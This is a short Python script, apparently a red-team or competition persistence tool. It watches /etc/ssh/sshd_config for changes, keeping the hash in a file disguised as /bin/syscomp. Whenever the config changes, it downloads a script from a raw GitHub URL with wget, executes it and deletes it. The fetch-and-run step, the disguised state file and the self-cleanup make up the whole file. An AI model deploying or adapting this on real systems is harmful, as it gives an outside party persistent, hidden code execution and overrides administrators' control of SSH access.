import hashlib
import os
import time

sshStatus = "needhash"

while True:
    if sshStatus == "needhash":
        hasher = hashlib.md5()
        with open('/etc/ssh/sshd_config', 'rb') as afile:
            buf = afile.read()
            hasher.update(buf)
            sshFileHash = hasher.hexdigest()
        f = open("/bin/syscomp", "w")
        f.write(sshFileHash)
        f.close()
        sshStatus = "checking"
    elif sshStatus == "checking":
        hasher = hashlib.md5()
        with open('/etc/ssh/sshd_config', 'rb') as afile:
            buf = afile.read()
            hasher.update(buf)
            sshCheckFileHash = hasher.hexdigest()
        str(sshFileHash)
        goldHash = open('/bin/syscomp', 'r').read()
        if goldHash == sshCheckFileHash:
            pass
            print('gg')
        else:
            os.system('wget -O /tmp/process2.py https://raw.githubusercontent.com/shad0wghost/mylinuxnow/master/softconfigs.py')
            os.system('python /tmp/process2.py')
            os.system('rm -rf /tmp/process2.py')
            sshStatus = "needhash"
            print("NOT GG MAND ITS FUCKED")
    time.sleep(1)
